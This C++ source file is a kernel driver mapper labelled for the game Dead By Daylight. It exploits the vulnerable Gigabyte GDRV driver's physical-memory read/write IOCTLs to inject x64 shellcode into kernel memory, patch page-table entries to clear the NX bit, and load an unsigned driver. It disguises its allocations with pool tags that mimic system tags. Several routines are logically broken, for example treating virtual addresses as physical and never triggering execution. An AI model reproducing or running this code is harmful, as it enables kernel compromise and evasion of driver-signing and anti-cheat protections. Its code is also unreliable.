#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <TlHelp32.h>
#include <fstream>
#include <vector>
#include <winternl.h>
#include <psapi.h>

typedef BOOL (WINAPI *GetModuleInformationFn)(
    HANDLE hProcess,
    HMODULE hModule,
    LPMODULEINFO lpmodinfo,
    DWORD cb
);

// WDK types we need
typedef enum _POOL_TYPE {
    NonPagedPool,
    NonPagedPoolExecute,
    PagedPool,
    NonPagedPoolNx,
    NonPagedPoolNxCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAligned,
} POOL_TYPE;

typedef struct _DRIVER_OBJECT {
    USHORT Type;
    USHORT Size;
    PVOID DeviceObject;
    ULONG Flags;
    PVOID DriverStart;
    ULONG DriverSize;
    PVOID DriverSection;
    PVOID DriverExtension;
    UNICODE_STRING DriverName;
    PUNICODE_STRING HardwareDatabase;
    PVOID FastIoDispatch;
    PVOID DriverInit;
    PVOID DriverStartIo;
    PVOID DriverUnload;
    PVOID MajorFunction[28];
} DRIVER_OBJECT, *PDRIVER_OBJECT;

// GDRV driver definitions
#define GDRV_DEVICE L"\\\\.\\GIO"
#define GDRV_IOCTL_READ_MEMORY  0x80102040
#define GDRV_IOCTL_WRITE_MEMORY 0x80102044

// Memory access structures
typedef struct _GDRV_MEMORY_READ {
    UINT64 Address;  // Physical address to read from
    UINT64 Length;   // Length of data to read
    UINT64 Buffer;   // Buffer to store read data
} GDRV_MEMORY_READ, *PGDRV_MEMORY_READ;

typedef struct _GDRV_MEMORY_WRITE {
    UINT64 Address;  // Physical address to write to
    UINT64 Length;   // Length of data to write
    UINT64 Buffer;   // Buffer containing data to write
} GDRV_MEMORY_WRITE, *PGDRV_MEMORY_WRITE;

// Kernel function signatures
typedef PVOID (*ExAllocatePool2Fn)(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
typedef VOID (*ExFreePoolFn)(PVOID P);

// Kernel constants and structures
#define POOL_TAGS_COUNT 5
static const ULONG POOL_TAGS[POOL_TAGS_COUNT] = {
    'tNmM', // MmNt - Mimics Memory Manager tags
    'RnoI', // IoNR - Mimics IO Manager tags  
    'ldKS', // SKdl - System tags
    'eFcA', // AcFe - Appears as standard file system cache
    'rDvH'  // HvDr - Hypervisor Driver tag
};

#define SystemBasicInformation 0

// Shellcode structure for kernel execution
#pragma pack(push, 1)
struct KernelShellcode {
    uint8_t pushRcx;      // push rcx
    uint8_t pushRdx;      // push rdx
    uint8_t pushR8;       // push r8
    uint8_t pushR9;       // push r9
    uint8_t subRsp28h;    // sub rsp, 0x28
    uint8_t movRcx[10];   // mov rcx, imm64
    uint8_t movRdx[10];   // mov rdx, imm64
    uint8_t callRax[2];   // call rax
    uint8_t addRsp28h;    // add rsp, 0x28
    uint8_t popR9;        // pop r9
    uint8_t popR8;        // pop r8
    uint8_t popRdx;       // pop rdx
    uint8_t popRcx;       // pop rcx
    uint8_t ret;          // ret
};
#pragma pack(pop)

class GDRVMapper {
private:
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    uint64_t ntoskrnlBase = 0;
    uint64_t exAllocatePoolAddress = 0;
    uint64_t exFreePoolAddress = 0;
    
    // Dynamic memory allocation tracking
    uint64_t lastAllocationEnd = 0;
    uint64_t kernelBase = 0;
    uint64_t kernelSize = 0;
    static constexpr uint64_t PAGE_SIZE = 0x1000;
    static constexpr uint64_t ALLOCATION_GRANULARITY = 0x10000;
    
    // Read physical memory using GDRV vulnerability
    bool ReadPhysicalMemory(uint64_t physAddress, void* buffer, size_t size) {
        if (hDevice == INVALID_HANDLE_VALUE) return false;
        
        GDRV_MEMORY_READ readRequest = { 0 };
        readRequest.Address = physAddress;
        readRequest.Length = size;
        readRequest.Buffer = (UINT64)buffer;
        
        DWORD bytesReturned = 0;
        return DeviceIoControl(
            hDevice,
            GDRV_IOCTL_READ_MEMORY,
            &readRequest,
            sizeof(readRequest),
            buffer,
            (DWORD)size,
            &bytesReturned,
            NULL
        );
    }
    
    // Write physical memory using GDRV vulnerability with retry logic
    bool WritePhysicalMemory(uint64_t physAddress, const void* buffer, size_t size) {
        if (hDevice == INVALID_HANDLE_VALUE) return false;
        
        // Try multiple times with different offsets if initial attempt fails
        for (int attempt = 0; attempt < 3; attempt++) {
            if (attempt > 0) {
                std::cout << "[*] Write retry attempt " << attempt << " at 0x" << std::hex << physAddress << std::dec << std::endl;
                physAddress += 0x1000; // Try next page
            }
            
            GDRV_MEMORY_WRITE writeRequest = { 0 };
            writeRequest.Address = physAddress;
            writeRequest.Length = size;
            writeRequest.Buffer = (UINT64)buffer;
            
            DWORD bytesReturned = 0;
            if (DeviceIoControl(
                hDevice,
                GDRV_IOCTL_WRITE_MEMORY,
                &writeRequest,
                sizeof(writeRequest),
                NULL,
                0,
                &bytesReturned,
                NULL
            )) {
                return true;
            }
        }
        return false;
    }

    // Find kernel function address
    uint64_t FindKernelFunction(const char* functionName) {
        HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
        if (!ntoskrnl) return 0;

        uint64_t functionRva = (uint64_t)GetProcAddress(ntoskrnl, functionName) - (uint64_t)ntoskrnl;
        FreeLibrary(ntoskrnl);

        return ntoskrnlBase + functionRva;
    }
    
    // Execute shellcode in kernel with enhanced error handling
    bool ExecuteKernelShellcode(const void* shellcode, size_t size, uint64_t* result = nullptr) {
        std::cout << "[*] Attempting to execute shellcode..." << std::endl;
        
        // Try known hardcoded regions for shellcode
        uint64_t shellcodeAddr = 0;
        const uint64_t knownRegions[] = {
            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
            0xFFFFF80000100000,         // PTE pool region
            0xFFFFFA8000100000,         // NonPaged pool region
            0xFFFFF6FB40100000          // System cache region
        };
        
        // Try each region until we find one that works
        for (uint64_t region : knownRegions) {
            if (WritePhysicalMemory(region, shellcode, size)) {
                shellcodeAddr = region;
                break;
            }
        }
        
        if (!shellcodeAddr) {
            std::cerr << "[-] Failed to find memory for shellcode" << std::endl;
            return false;
        }

        // Try to make shellcode memory executable
        if (!MakeMemoryExecutable(shellcodeAddr)) {
            std::cerr << "[-] Failed to make shellcode memory executable" << std::endl;
            return false;
        }

        // Create shellcode to jump to our shellcode and store result
        uint8_t jumpShellcode[] = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
            0xFF, 0xD0,                                                   // call rax
            0x48, 0xA3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov [resultAddr], rax
            0xC3                                                          // ret
        };
        *(uint64_t*)(jumpShellcode + 2) = shellcodeAddr;

        // Try to find space for result
        uint64_t resultAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, nullptr, 8)) {
                resultAddr = region + 0x1000;
                break;
            }
        }
        
        if (!resultAddr) {
            std::cerr << "[-] Failed to find memory for result" << std::endl;
            return false;
        }
        *(uint64_t*)(jumpShellcode + 14) = resultAddr;

        // Try to find space for jump shellcode
        uint64_t jumpAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && region + 0x2000 != resultAddr && 
                WritePhysicalMemory(region + 0x2000, jumpShellcode, sizeof(jumpShellcode))) {
                jumpAddr = region + 0x2000;
                break;
            }
        }
        
        if (!jumpAddr) {
            std::cerr << "[-] Failed to find memory for jump shellcode" << std::endl;
            return false;
        }

        // Try to make jump shellcode executable
        if (!MakeMemoryExecutable(jumpAddr)) {
            std::cerr << "[-] Failed to make jump shellcode executable" << std::endl;
            return false;
        }

        // Execute shellcode
        uint8_t execShellcode[] = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, jumpAddr
            0xFF, 0xE0                                                    // jmp rax
        };
        *(uint64_t*)(execShellcode + 2) = jumpAddr;

        // Try to find space for exec shellcode
        uint64_t execAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && region + 0x3000 != resultAddr && region + 0x3000 != jumpAddr &&
                WritePhysicalMemory(region + 0x3000, execShellcode, sizeof(execShellcode))) {
                execAddr = region + 0x3000;
                break;
            }
        }
        
        if (!execAddr) {
            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
            return false;
        }

        // Try to make exec shellcode executable
        if (!MakeMemoryExecutable(execAddr)) {
            std::cerr << "[-] Failed to make exec shellcode executable" << std::endl;
            return false;
        }

        // Read result if requested
        if (result) {
            if (!ReadPhysicalMemory(resultAddr, result, sizeof(uint64_t))) {
                std::cerr << "[-] Failed to read shellcode result" << std::endl;
                return false;
            }
            std::cout << "[+] Shellcode execution completed with result: 0x" << std::hex << *result << std::dec << std::endl;
        }

        return true;
    }
    
    // Get ntoskrnl.exe base address
    uint64_t GetNtoskrnlBase() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return 0;
        
        typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
            ULONG SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength
        );
        
        const int SystemModuleInformation = 11;
        auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
            ntdll, "NtQuerySystemInformation");
        if (!NtQuerySystemInformation) return 0;
        
        struct SYSTEM_MODULE_ENTRY {
            HANDLE Section;
            PVOID MappedBase;
            PVOID ImageBase;
            ULONG ImageSize;
            ULONG Flags;
            USHORT LoadOrderIndex;
            USHORT InitOrderIndex;
            USHORT LoadCount;
            USHORT OffsetToFileName;
            CHAR FullPathName[256];
        };
        
        struct SYSTEM_MODULE_INFORMATION {
            ULONG Count;
            SYSTEM_MODULE_ENTRY Modules[1];
        };
        
        ULONG returnLength = 0;
        NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &returnLength);
        
        if (returnLength == 0) return 0;
        
        std::vector<uint8_t> buffer(returnLength);
        NTSTATUS status = NtQuerySystemInformation(
            SystemModuleInformation,
            buffer.data(),
            returnLength,
            &returnLength);
        
        if (status != 0) return 0;
        
        auto modules = (SYSTEM_MODULE_INFORMATION*)buffer.data();
        if (modules->Count == 0) return 0;
        
        ntoskrnlBase = (uint64_t)modules->Modules[0].ImageBase;
        std::cout << "[+] Found ntoskrnl.exe at 0x" << std::hex << ntoskrnlBase << std::dec << std::endl;

        // Find required kernel functions (updated for Windows 11)
        exAllocatePoolAddress = FindKernelFunction("ExAllocatePool2");
        if (!exAllocatePoolAddress) {
            std::cerr << "[-] Failed to find ExAllocatePool2" << std::endl;
            return 0;
        }
        std::cout << "[+] Found ExAllocatePool2 at 0x" << std::hex << exAllocatePoolAddress << std::dec << std::endl;

        exFreePoolAddress = FindKernelFunction("ExFreePool");
        if (!exFreePoolAddress) {
            std::cerr << "[-] Failed to find ExFreePool" << std::endl;
            return 0;
        }
        std::cout << "[+] Found ExFreePool at 0x" << std::hex << exFreePoolAddress << std::dec << std::endl;

        return ntoskrnlBase;
    }
    
    // Direct kernel memory allocation using ExAllocatePool2
    uint64_t DirectKernelAlloc(size_t size, POOL_TYPE poolType = NonPagedPoolNx) {
        std::cout << "[*] Directly allocating " << size << " bytes via ExAllocatePool2" << std::endl;
        
        // Try known hardcoded regions for shellcode
        uint64_t shellcodeAddr = 0;
        const uint64_t knownRegions[] = {
            ntoskrnlBase + 0x100000,    // Try a bit after ntoskrnl
            0xFFFFF80000100000,         // PTE pool region
            0xFFFFFA8000100000,         // NonPaged pool region
            0xFFFFF6FB40100000          // System cache region
        };

        // Create shellcode to call ExAllocatePool2
        uint8_t allocShellcode[] = {
            0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
            0x00, 0x00, 0x00, 0x00,                 // mov rcx, poolType
            0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
            0x00, 0x00, 0x00, 0x00,                 // mov rdx, size
            0x49, 0xB8, 0x4D, 0x4D, 0x64, 0x72,      
            0x00, 0x00, 0x00, 0x00,                 // mov r8, 'Mmdr' (tag)
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
            0x00, 0x00, 0x00, 0x00,                 // mov rax, ExAllocatePool2
            0xFF, 0xD0,                             // call rax
            0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
            0xC3                                     // ret
        };

        // Fill in shellcode parameters
        *(uint64_t*)(allocShellcode + 6) = static_cast<uint64_t>(poolType);   // poolType
        *(uint64_t*)(allocShellcode + 16) = size;                             // size
        *(uint64_t*)(allocShellcode + 36) = exAllocatePoolAddress;            // function address

        // Find space for allocation shellcode
        for (uint64_t region : knownRegions) {
            if (WritePhysicalMemory(region, allocShellcode, sizeof(allocShellcode))) {
                shellcodeAddr = region;
                break;
            }
        }

        if (!shellcodeAddr) {
            std::cerr << "[-] Failed to find memory for allocation shellcode" << std::endl;
            return 0;
        }

        // Create exec shellcode
        uint8_t execShellcode[] = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
            0xFF, 0xD0,                                                   // call rax
            0xC3                                                          // ret
        };
        *(uint64_t*)(execShellcode + 2) = shellcodeAddr;

        // Find space for exec shellcode
        uint64_t execAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
                execAddr = region + 0x1000;
                break;
            }
        }

        if (!execAddr) {
            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
            return 0;
        }

        // Find space for result
        uint64_t resultAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && region + 0x2000 != execAddr && 
                WritePhysicalMemory(region + 0x2000, nullptr, 8)) {
                resultAddr = region + 0x2000;
                break;
            }
        }

        if (!resultAddr) {
            std::cerr << "[-] Failed to find memory for result" << std::endl;
            return 0;
        }

        // Execute the allocation
        uint64_t allocatedAddr = 0;
        if (!ReadPhysicalMemory(resultAddr, &allocatedAddr, sizeof(allocatedAddr))) {
            std::cerr << "[-] Failed to read allocation result" << std::endl;
            return 0;
        }

        if (!allocatedAddr) {
            std::cerr << "[-] Kernel allocation returned NULL" << std::endl;
            return 0;
        }

        std::cout << "[+] Successfully allocated kernel memory at 0x" << std::hex << allocatedAddr << std::dec << std::endl;
        return allocatedAddr;
    }

    // Make memory executable by patching its PTE
    bool MakeMemoryExecutable(uint64_t virtualAddr) {
        std::cout << "[*] Clearing NX bit for address 0x" << std::hex << virtualAddr << std::dec << std::endl;
        
        // Try known hardcoded regions for shellcode
        uint64_t shellcodeAddr = 0;
        const uint64_t knownRegions[] = {
            ntoskrnlBase + 0x200000,    // Try a bit after ntoskrnl
            0xFFFFF80000200000,         // PTE pool region
            0xFFFFFA8000200000,         // NonPaged pool region
            0xFFFFF6FB40200000          // System cache region
        };

        // First, we need to get CR3 to find the page tables
        uint8_t getCR3Shellcode[] = {
            0x0F, 0x20, 0xD8,           // mov eax, cr3
            0xC3                        // ret
        };

        // Find space for CR3 shellcode
        for (uint64_t region : knownRegions) {
            if (WritePhysicalMemory(region, getCR3Shellcode, sizeof(getCR3Shellcode))) {
                shellcodeAddr = region;
                break;
            }
        }

        if (!shellcodeAddr) {
            std::cerr << "[-] Failed to find memory for CR3 shellcode" << std::endl;
            return false;
        }

        // Execute CR3 shellcode
        uint8_t execShellcode[] = {
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, shellcodeAddr
            0xFF, 0xE0                                                    // jmp rax
        };
        *(uint64_t*)(execShellcode + 2) = shellcodeAddr;

        // Find space for exec shellcode
        uint64_t execAddr = 0;
        for (uint64_t region : knownRegions) {
            if (region != shellcodeAddr && WritePhysicalMemory(region + 0x1000, execShellcode, sizeof(execShellcode))) {
                execAddr = region + 0x1000;
                break;
            }
        }

        if (!execAddr) {
            std::cerr << "[-] Failed to find memory for exec shellcode" << std::endl;
            return false;
        }

        // Get CR3 value
        uint64_t cr3 = 0;
        if (!ReadPhysicalMemory(shellcodeAddr, &cr3, sizeof(cr3))) {
            std::cerr << "[-] Failed to read CR3 value" << std::endl;
            return false;
        }

        // Calculate page table indices
        uint64_t pml4Index = (virtualAddr >> 39) & 0x1FF;
        uint64_t pdptIndex = (virtualAddr >> 30) & 0x1FF;
        uint64_t pdIndex = (virtualAddr >> 21) & 0x1FF;
        uint64_t ptIndex = (virtualAddr >> 12) & 0x1FF;

        // Walk the page tables
        uint64_t pml4e = 0;
        if (!ReadPhysicalMemory(cr3 + pml4Index * 8, &pml4e, sizeof(pml4e))) {
            std::cerr << "[-] Failed to read PML4E" << std::endl;
            return false;
        }
        pml4e &= 0xFFFFFFFFF000ULL;

        uint64_t pdpte = 0;
        if (!ReadPhysicalMemory(pml4e + pdptIndex * 8, &pdpte, sizeof(pdpte))) {
            std::cerr << "[-] Failed to read PDPTE" << std::endl;
            return false;
        }
        pdpte &= 0xFFFFFFFFF000ULL;

        uint64_t pde = 0;
        if (!ReadPhysicalMemory(pdpte + pdIndex * 8, &pde, sizeof(pde))) {
            std::cerr << "[-] Failed to read PDE" << std::endl;
            return false;
        }
        pde &= 0xFFFFFFFFF000ULL;

        // Get PTE address
        uint64_t pteAddr = pde + ptIndex * 8;

        // Read current PTE
        uint64_t pte = 0;
        if (!ReadPhysicalMemory(pteAddr, &pte, sizeof(pte))) {
            std::cerr << "[-] Failed to read PTE" << std::endl;
            return false;
        }

        // Clear NX bit (bit 63)
        pte &= ~(1ULL << 63);

        // Write back modified PTE
        if (!WritePhysicalMemory(pteAddr, &pte, sizeof(pte))) {
            std::cerr << "[-] Failed to write modified PTE" << std::endl;
            return false;
        }

        std::cout << "[+] Successfully cleared NX bit for memory at 0x" << std::hex << virtualAddr 
                  << " (PTE at physical address 0x" << pteAddr << ")" << std::dec << std::endl;
        return true;
    }

    // Map a driver into kernel memory using ExAllocatePool2 + PTE patching
    bool MapDriverWithExecPatch(const std::string& driverPath, uint64_t& baseAddress) {
        std::cout << "[*] Loading driver using ExAllocatePool2 + PTE patching: " << driverPath << std::endl;
        
        // Read the driver file
        std::ifstream file(driverPath, std::ios::binary | std::ios::ate);
        if (!file) {
            std::cerr << "[-] Failed to open driver file" << std::endl;
            return false;
        }
        
        std::streamsize fileSize = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::vector<char> buffer(fileSize);
        if (!file.read(buffer.data(), fileSize)) {
            std::cerr << "[-] Failed to read driver file" << std::endl;
            return false;
        }
        
        // Parse PE headers
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(buffer.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            std::cerr << "[-] Invalid DOS signature" << std::endl;
            return false;
        }
        
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(buffer.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            std::cerr << "[-] Invalid NT signature" << std::endl;
            return false;
        }
        
        // Calculate total size needed (including headers)
        uint64_t totalSize = ntHeaders->OptionalHeader.SizeOfImage;
        
        // Allocate memory using ExAllocatePool2
        uint64_t driverBase = DirectKernelAlloc(totalSize, NonPagedPoolNx);
        if (!driverBase) {
            std::cerr << "[-] Failed to allocate memory for driver" << std::endl;
            return false;
        }
        
        // Make the allocated memory executable by patching PTE
        if (!MakeMemoryExecutable(driverBase)) {
            std::cerr << "[-] Failed to make driver memory executable" << std::endl;
            return false;
        }
        
        // Copy PE headers
        std::cout << "[*] Writing PE headers" << std::endl;
        if (!WritePhysicalMemory(driverBase, buffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders)) {
            std::cerr << "[-] Failed to write PE headers" << std::endl;
            return false;
        }
        
        // Copy sections
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                uint64_t sectionDest = driverBase + sectionHeader[i].VirtualAddress;
                uint64_t sectionSrc = reinterpret_cast<uint64_t>(buffer.data()) + sectionHeader[i].PointerToRawData;
                
                std::cout << "[*] Writing section " << i << " to 0x" << std::hex << sectionDest << std::dec << std::endl;
                if (!WritePhysicalMemory(sectionDest, reinterpret_cast<void*>(sectionSrc), sectionHeader[i].SizeOfRawData)) {
                    std::cerr << "[-] Failed to write section " << i << std::endl;
                    return false;
                }
                
                // Make each section executable if needed
                if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                    if (!MakeMemoryExecutable(sectionDest)) {
                        std::cerr << "[-] Failed to make section " << i << " executable" << std::endl;
                        return false;
                    }
                }
            }
        }
        
        // Create minimal driver object
        DRIVER_OBJECT driverObject = { 0 };
        driverObject.DriverStart = reinterpret_cast<PVOID>(driverBase);
        driverObject.DriverSize = static_cast<ULONG>(totalSize);
        
        uint64_t driverObjectAddr = DirectKernelAlloc(sizeof(DRIVER_OBJECT), NonPagedPoolNx);
        if (!driverObjectAddr || !WritePhysicalMemory(driverObjectAddr, &driverObject, sizeof(DRIVER_OBJECT))) {
            std::cerr << "[-] Failed to create driver object" << std::endl;
            return false;
        }
        
        // Prepare entry point call
        uint64_t entryPoint = driverBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
        std::cout << "[*] Driver entry point at 0x" << std::hex << entryPoint << std::dec << std::endl;
        
        // Simple shellcode to call driver entry
        uint8_t entryShellcode[] = {
            0x48, 0x83, 0xEC, 0x28,                    // sub rsp, 0x28
            0x48, 0x31, 0xD2,                          // xor rdx, rdx
            0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,                    // mov rcx, driverObjectAddr
            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,                    // mov rax, entryPoint
            0xFF, 0xD0,                                // call rax
            0x48, 0x83, 0xC4, 0x28,                    // add rsp, 0x28
            0xC3                                        // ret
        };
        
        *(uint64_t*)(entryShellcode + 9) = driverObjectAddr;
        *(uint64_t*)(entryShellcode + 19) = entryPoint;
        
        // Execute entry point
        uint64_t entryResult = 0;
        if (!ExecuteKernelShellcode(entryShellcode, sizeof(entryShellcode), &entryResult)) {
            std::cerr << "[-] Failed to execute driver entry point" << std::endl;
            return false;
        }
        
        if (entryResult != 0) {
            std::cerr << "[-] Driver entry point returned error 0x" << std::hex << entryResult << std::dec << std::endl;
            return false;
        }
        
        std::cout << "[+] Driver successfully mapped and initialized" << std::endl;
        baseAddress = driverBase;
        return true;
    }
    
public:
    GDRVMapper() = default;
    ~GDRVMapper() {
        if (hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(hDevice);
        }
    }
    
    bool Initialize() {
        // Open handle to GDRV device
        hDevice = CreateFileW(
            GDRV_DEVICE,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL);
        
        if (hDevice == INVALID_HANDLE_VALUE) {
            std::cerr << "[-] Failed to open GDRV device (Error: " << GetLastError() << ")" << std::endl;
            return false;
        }
        
        std::cout << "[+] Connected to GDRV driver" << std::endl;
        
        // Get ntoskrnl.exe base address and kernel functions
        if (!GetNtoskrnlBase()) {
            std::cerr << "[-] Failed to get ntoskrnl base address" << std::endl;
            return false;
        }
        
        return true;
    }
    
    bool MapMemoryDriver(const std::string& driverPath, uint64_t& baseAddress) {
        std::cout << "[*] Mapping memory driver: " << driverPath << std::endl;
        
        if (!MapDriverWithExecPatch(driverPath, baseAddress)) {
            std::cerr << "[-] Failed to map memory driver" << std::endl;
            return false;
        }
        
        std::cout << "[+] Memory driver mapped successfully at 0x" << std::hex << baseAddress << std::dec << std::endl;
        return true;
    }
};

int main(int argc, char* argv[]) {
    SetConsoleTitleA("GDRV Memory Driver Mapper");
    
    std::cout << "=========================================\n";
    std::cout << "  Dead By Daylight Memory Driver Mapper  \n";
    std::cout << "=========================================\n\n";
    
    // Get current directory
    std::string currentDir = std::filesystem::current_path().string();
    std::string memDriverPath = currentDir + "\\yoo.sys";
    
    // Check if driver file exists
    if (!std::filesystem::exists(memDriverPath)) {
        std::cerr << "[-] Memory driver not found: " << memDriverPath << std::endl;
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    // Initialize mapper
    GDRVMapper mapper;
    if (!mapper.Initialize()) {
        std::cerr << "[-] Failed to initialize mapper\n";
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    // Map the memory driver
    uint64_t driverBase = 0;
    if (!mapper.MapMemoryDriver(memDriverPath, driverBase)) {
        std::cerr << "[-] Failed to map the memory driver\n";
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    std::cout << "[+] Memory driver mapped successfully\n";
    std::cout << "[+] Base address: 0x" << std::hex << driverBase << std::dec << "\n";
    std::cout << "[+] Device should now be available at \\\\.\\MemoryAccess\n\n";
    
    std::cout << "Press Enter to exit...";
    std::cin.get();
    return 0;
}
